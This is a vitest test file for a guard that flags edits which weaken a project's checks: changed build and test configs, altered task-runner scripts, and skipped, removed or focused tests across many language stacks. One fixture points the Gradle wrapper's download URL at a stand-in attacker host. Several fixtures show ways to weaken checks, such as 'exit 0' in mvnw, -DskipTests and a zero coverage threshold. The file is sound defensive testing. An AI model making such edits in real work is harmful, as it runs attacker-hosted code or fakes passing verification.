import { describe, expect, it } from 'vitest';
import { checkGuardFindings } from '../src/checkGuard/checkGuardFindings';
import type { GuardReaders } from '../src/checkGuard/types';
import type { CheckSpec } from '../src/model/verification';
import { stackRepo } from './fakes/stackRepo';

type Files = Record<string, string>;

const readers = (before: Files, after: Files): GuardReaders => ({
  before: async (rel) => before[rel] ?? null,
  after: async (rel) => after[rel] ?? null,
});

/**
 * The guard's findings for one check, on a fixture repo (test/fixtures/check-stacks/<stack>) before the work and
 * with `edits` applied after it (a file set to null is deleted).
 */
async function guard(o: { stack: string; run: string; cwd?: string; edits: Record<string, string | null> }) {
  const before = stackRepo(o.stack);
  const after: Files = { ...before };
  for (const [file, text] of Object.entries(o.edits)) {
    if (text === null) delete after[file];
    else after[file] = text;
  }
  const spec: CheckSpec = { run: o.run.split(' '), timeoutSec: 60, ...(o.cwd ? { cwd: o.cwd } : {}) };
  const found = await checkGuardFindings({
    checks: [{ name: 'c', spec }],
    changed: Object.keys(o.edits),
    read: readers(before, after),
  });
  return found.map((f) => f.text);
}

const append = (stack: string, file: string, text: string) => ({ [file]: `${stackRepo(stack)[file] ?? ''}${text}` });

describe('check guard per stack: runner configs', () => {
  it('Rust: .cargo/config.toml and Cargo.toml’s profiles and test targets, not its dependencies', async () => {
    expect(
      await guard({ stack: 'rust', run: 'cargo test --locked', edits: { '.cargo/config.toml': '[build]\n' } }),
    ).toEqual([".cargo/config.toml changed (cargo's config)"]);
    // a check in a member crate still reads the workspace's .cargo/config.toml
    expect(
      await guard({ stack: 'rust', run: 'cargo test', cwd: 'src', edits: { '.cargo/config.toml': '[build]\n' } }),
    ).toEqual([".cargo/config.toml changed (cargo's config)"]);
    expect(
      await guard({
        stack: 'rust',
        run: 'cargo test',
        edits: append('rust', 'Cargo.toml', '\n[dependencies]\nserde = "1"\n'),
      }),
    ).toEqual([]);
    expect(
      await guard({
        stack: 'rust',
        run: 'cargo test',
        edits: append('rust', 'Cargo.toml', '\n[[test]]\nname = "it"\nharness = false\n'),
      }),
    ).toEqual(["Cargo.toml changed in cargo's section"]);
    expect(await guard({ stack: 'rust', run: 'cargo clippy', edits: { 'clippy.toml': 'msrv = "1.70"\n' } })).toEqual([
      "clippy.toml changed (cargo's config)",
    ]);
  });

  it('Gradle and Maven: build scripts, properties and the wrapper’s distribution', async () => {
    expect(
      await guard({
        stack: 'gradle',
        run: './gradlew test',
        edits: append('gradle', 'core/build.gradle.kts', 'tasks.test { enabled = false }\n'),
      }),
    ).toEqual(["core/build.gradle.kts changed (gradlew's config)"]);
    expect(
      await guard({
        stack: 'gradle',
        run: './gradlew test',
        edits: { 'gradle/wrapper/gradle-wrapper.properties': 'distributionUrl=https\\://evil.example/g.zip\n' },
      }),
    ).toEqual(["gradle/wrapper/gradle-wrapper.properties changed (gradlew's config)"]);
    expect(
      await guard({ stack: 'maven', run: 'mvn -B verify', edits: append('maven', 'pom.xml', '<!-- skipTests -->\n') }),
    ).toEqual(["pom.xml changed (mvn's config)"]);
    expect(
      await guard({ stack: 'maven', run: './mvnw -B verify', edits: { '.mvn/maven.config': '-DskipTests\n' } }),
    ).toEqual([".mvn/maven.config changed (mvnw's config)"]);
    expect(
      await guard({ stack: 'maven', run: './mvnw -B verify', edits: append('maven', 'mvnw', 'exit 0\n') }),
    ).toEqual(['mvnw changed (the check runs it)']);
  });

  it('.NET: project files, Directory.Build.props, runsettings', async () => {
    expect(
      await guard({
        stack: 'dotnet',
        run: 'dotnet test',
        edits: {
          'tests/App.Tests/App.Tests.csproj':
            '<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><IsTestProject>false</IsTestProject></PropertyGroup></Project>\n',
          'Directory.Build.props': '<Project/>\n',
        },
      }),
    ).toEqual([
      "Directory.Build.props changed (dotnet's config)",
      "tests/App.Tests/App.Tests.csproj changed (dotnet's config)",
    ]);
  });

  it('Ruby: reads through bundle exec, in a Makefile too', async () => {
    expect(await guard({ stack: 'ruby', run: 'bundle exec rspec', edits: { '.rspec': '--tag ~slow\n' } })).toEqual([
      ".rspec changed (rspec's config)",
    ]);
    expect(
      await guard({
        stack: 'ruby',
        run: 'bundle exec rubocop',
        edits: { '.rubocop_todo.yml': 'Style/All:\n  Enabled: false\n' },
      }),
    ).toEqual([".rubocop_todo.yml changed (rubocop's config)"]);
    const makefile = 'test:\n\tbundle exec rspec\n';
    expect(
      await guard({ stack: 'ruby', run: 'make test', edits: { Makefile: makefile, '.rspec': '--tag ~slow\n' } }),
    ).toContain(".rspec changed (rspec's config)");
  });

  it('Python: through uv run and poetry run; a lowered coverage threshold counts', async () => {
    expect(
      await guard({
        stack: 'python-uv',
        run: 'uv run --frozen pytest',
        edits: append('python-uv', 'pyproject.toml', '\n[tool.coverage.report]\nfail_under = 0\n'),
      }),
    ).toEqual(["pyproject.toml changed in pytest's section"]);
    expect(
      await guard({
        stack: 'python-uv',
        run: 'uv run --frozen pytest',
        edits: append('python-uv', 'pyproject.toml', '\n[project.optional-dependencies]\nx = ["y"]\n'),
      }),
    ).toEqual([]);
    expect(
      await guard({ stack: 'python-poetry', run: 'poetry run mypy .', edits: { 'mypy.ini': '[mypy]\n' } }),
    ).toEqual(["mypy.ini changed (mypy's config)"]);
    expect(await guard({ stack: 'python-uv', run: '.venv/bin/pytest', edits: { 'conftest.py': 'x = 1\n' } })).toEqual([
      "conftest.py changed (pytest's config)",
    ]);
    // the same name outside the repo is no pytest: its settings aren't what that program reads
    for (const run of ['/tmp/x/pytest', '../x/.venv/bin/pytest', 'uv run --frozen --directory ../x pytest'])
      expect(await guard({ stack: 'python-uv', run, edits: { 'conftest.py': 'x = 1\n' } })).toEqual([]);
    // a wrapper's folder is where its tool runs (one reading of wrappers: verification/wrapperArgv.ts)
    expect(
      await guard({ stack: 'python-uv', run: 'pdm run --project . pytest', edits: { 'conftest.py': 'x = 1\n' } }),
    ).toEqual(["conftest.py changed (pytest's config)"]);
  });

  it('PHP: composer scripts, vendor/bin tools, a baseline that ignores errors', async () => {
    const scripts = (test: unknown) => `${JSON.stringify({ name: 'acme/app', scripts: { test } }, null, 2)}\n`;
    expect(
      await guard({ stack: 'php', run: 'composer test', edits: { 'composer.json': scripts('phpunit --group fast') } }),
    ).toEqual(['composer.json scripts.test changed']);
    expect(await guard({ stack: 'php', run: 'composer test', edits: { 'phpunit.xml.dist': '<phpunit/>\n' } })).toEqual([
      "phpunit.xml.dist changed (phpunit's config)",
    ]);
    const viaPhp = { ...stackRepo('php'), 'composer.json': scripts(['@php vendor/bin/phpunit']) };
    const found = await checkGuardFindings({
      checks: [{ name: 'c', spec: { run: ['composer', 'test'], timeoutSec: 60 } }],
      changed: ['phpunit.xml.dist'],
      read: readers(viaPhp, { ...viaPhp, 'phpunit.xml.dist': '<phpunit/>\n' }),
    });
    expect(found.map((f) => f.text)).toEqual(["phpunit.xml.dist changed (phpunit's config)"]);
    expect(
      await guard({
        stack: 'php',
        run: 'vendor/bin/phpstan analyse',
        edits: { 'phpstan-baseline.neon': 'parameters:\n' },
      }),
    ).toEqual(["phpstan-baseline.neon changed (phpstan's config)"]);
  });

  it('Swift, Elixir, Dart, Angular', async () => {
    expect(
      await guard({ stack: 'swift', run: 'swift test', edits: append('swift', 'Package.swift', '// x\n') }),
    ).toEqual(["Package.swift changed (swift's config)"]);
    expect(
      await guard({
        stack: 'elixir',
        run: 'mix test',
        edits: { 'test/test_helper.exs': 'ExUnit.start(exclude: [:all])\n' },
      }),
    ).toEqual(["test/test_helper.exs changed (mix's config)"]);
    expect(await guard({ stack: 'dart', run: 'dart test', edits: { 'dart_test.yaml': 'tags:\n' } })).toEqual([
      "dart_test.yaml changed (dart's config)",
    ]);
    expect(
      await guard({
        stack: 'node-angular',
        run: 'npm test',
        cwd: 'apps/web',
        edits: append('node-angular', 'apps/web/angular.json', ' '),
      }),
    ).toEqual(["apps/web/angular.json changed (ng's config)"]);
  });
});

describe('check guard per stack: task runners', () => {
  it('follows turbo run into each changed package’s script and the tools it runs', async () => {
    const web = JSON.parse(stackRepo('pnpm-turbo')['apps/web/package.json']) as { scripts: Files };
    const weakened = `${JSON.stringify({ ...web, scripts: { ...web.scripts, test: 'vitest run --passWithNoTests' } }, null, 2)}\n`;
    expect(
      await guard({ stack: 'pnpm-turbo', run: 'turbo run test', edits: { 'apps/web/package.json': weakened } }),
    ).toEqual(['apps/web/package.json scripts.test changed']);
    // npm test runs `turbo run test`, so the same holds through it
    expect(
      await guard({ stack: 'pnpm-turbo', run: 'pnpm test', edits: { 'apps/web/package.json': weakened } }),
    ).toEqual(['apps/web/package.json scripts.test changed']);
    expect(
      await guard({
        stack: 'pnpm-turbo',
        run: 'turbo run test',
        edits: { 'apps/web/vitest.config.ts': 'export default {};\n' },
      }),
    ).toEqual(["apps/web/vitest.config.ts changed (vitest's config)"]);
    expect(
      await guard({ stack: 'pnpm-turbo', run: 'turbo run lint', edits: { 'apps/web/package.json': weakened } }),
    ).toEqual([]);
  });

  it('follows nx targets into project.json and the commands they run', async () => {
    const project = (command: string, extra: Files = {}) =>
      `${JSON.stringify({ name: 'web', targets: { test: { executor: 'nx:run-commands', options: { command } }, ...extra } }, null, 2)}\n`;
    expect(
      await guard({ stack: 'nx', run: 'nx test web', edits: { 'apps/web/project.json': project('echo ok') } }),
    ).toEqual(['apps/web/project.json targets.test changed']);
    expect(
      await guard({
        stack: 'nx',
        run: 'nx run web:test',
        edits: { 'apps/web/vitest.config.ts': 'export default {};\n' },
      }),
    ).toEqual(["apps/web/vitest.config.ts changed (vitest's config)"]);
    expect(
      await guard({
        stack: 'nx',
        run: 'nx run-many -t test',
        edits: { 'apps/web/project.json': project('vitest run', { build: 'x' }) },
      }),
    ).toEqual([]);
    expect(
      await guard({ stack: 'nx', run: 'nx test api', edits: { 'apps/web/project.json': project('echo ok') } }),
    ).toEqual([]);
  });
});

describe('check guard per stack: weakened tests', () => {
  const cases: [label: string, file: string, before: string, after: string, found: string][] = [
    [
      'cargo #[ignore]',
      'src/lib.rs',
      '#[test]\nfn a() {}\n',
      '#[test]\n#[ignore]\nfn a() {}\n',
      '1 test skipped in src/lib.rs',
    ],
    [
      'JUnit @Disabled',
      'src/test/java/AppTest.java',
      '@Test\nvoid a() {}\n',
      '@Disabled\n@Test\nvoid a() {}\n',
      '1 test skipped in src/test/java/AppTest.java',
    ],
    [
      'JUnit 4 @Ignore',
      'src/test/kotlin/AppTest.kt',
      '@Test fun a() {}\n',
      '@Ignore @Test fun a() {}\n',
      '1 test skipped in src/test/kotlin/AppTest.kt',
    ],
    [
      'xUnit Skip=',
      'tests/App.Tests/AppTests.cs',
      '[Fact]\npublic void A() {}\n',
      '[Fact(Skip = "flaky")]\npublic void A() {}\n',
      '1 test skipped in tests/App.Tests/AppTests.cs',
    ],
    [
      'NUnit [Ignore]',
      'App.Tests/CalcTests.cs',
      '[Test]\npublic void A() {}\n',
      '[Test, Ignore("x")]\npublic void A() {}\n',
      '1 test skipped in App.Tests/CalcTests.cs',
    ],
    [
      'PHPUnit markTestSkipped',
      'tests/AppTest.php',
      'public function testA(): void {}\n',
      'public function testA(): void { $this->markTestSkipped(); }\n',
      '1 test skipped in tests/AppTest.php',
    ],
    [
      'PHPUnit removed',
      'tests/AppTest.php',
      'public function testA() {}\npublic function testB() {}\n',
      'public function testA() {}\n',
      '1 test removed from tests/AppTest.php',
    ],
    ['RSpec xit', 'spec/app_spec.rb', "it 'a' do\nend\n", "xit 'a' do\nend\n", '1 test skipped in spec/app_spec.rb'],
    [
      'RSpec skip',
      'spec/app_spec.rb',
      "it 'a' do\nend\n",
      "it 'a' do\n  skip 'later'\nend\n",
      '1 test skipped in spec/app_spec.rb',
    ],
    [
      'Go t.Skip',
      'svc/app_test.go',
      'func TestA(t *testing.T) {}\n',
      'func TestA(t *testing.T) { t.Skip() }\n',
      '1 test skipped in svc/app_test.go',
    ],
    [
      'pytest mark',
      'tests/test_app.py',
      'def test_a():\n    pass\n',
      '@pytest.mark.skip\ndef test_a():\n    pass\n',
      '1 test skipped in tests/test_app.py',
    ],
    [
      'unittest expectedFailure',
      'tests/test_app.py',
      'def test_a(self):\n    pass\n',
      '@unittest.expectedFailure\ndef test_a(self):\n    pass\n',
      '1 test skipped in tests/test_app.py',
    ],
    [
      'Swift XCTSkip',
      'Tests/AppTests/AppTests.swift',
      'func testA() throws {}\n',
      'func testA() throws { throw XCTSkip("x") }\n',
      '1 test skipped in Tests/AppTests/AppTests.swift',
    ],
    [
      'Swift Testing .disabled',
      'Tests/AppTests/AppTests.swift',
      '@Test func a() {}\n',
      '@Test(.disabled()) func a() {}\n',
      '1 test skipped in Tests/AppTests/AppTests.swift',
    ],
    [
      'ExUnit @tag :skip',
      'test/app_test.exs',
      'test "a" do\nend\n',
      '@tag :skip\ntest "a" do\nend\n',
      '1 test skipped in test/app_test.exs',
    ],
    [
      'Dart skip:',
      'test/app_test.dart',
      "test('a', () {});\n",
      "test('a', () {}, skip: 'later');\n",
      '1 test skipped in test/app_test.dart',
    ],
    [
      'Pest only',
      'tests/Feature/AppTest.php',
      "it('a', fn () => true);\n",
      "it('a', fn () => true)->only();\n",
      '1 test focused with .only in tests/Feature/AppTest.php',
    ],
  ];
  it.each(cases)('%s', async (_label, file, before, after, found) => {
    const result = await checkGuardFindings({
      checks: [],
      changed: [file],
      read: readers({ [file]: before }, { [file]: after }),
    });
    expect(result.map((f) => f.text)).toEqual([found]);
  });

  it('an edited body, a renamed test and a new test are not findings', async () => {
    const file = 'tests/App.Tests/AppTests.cs';
    const before = '[Fact]\npublic void A() { Assert.True(true); }\n';
    const after = `${before.replace('A()', 'Renamed()').replace('true', '1 == 1')}[Theory]\npublic void B() {}\n`;
    const result = await checkGuardFindings({
      checks: [],
      changed: [file],
      read: readers({ [file]: before }, { [file]: after }),
    });
    expect(result).toEqual([]);
  });
});
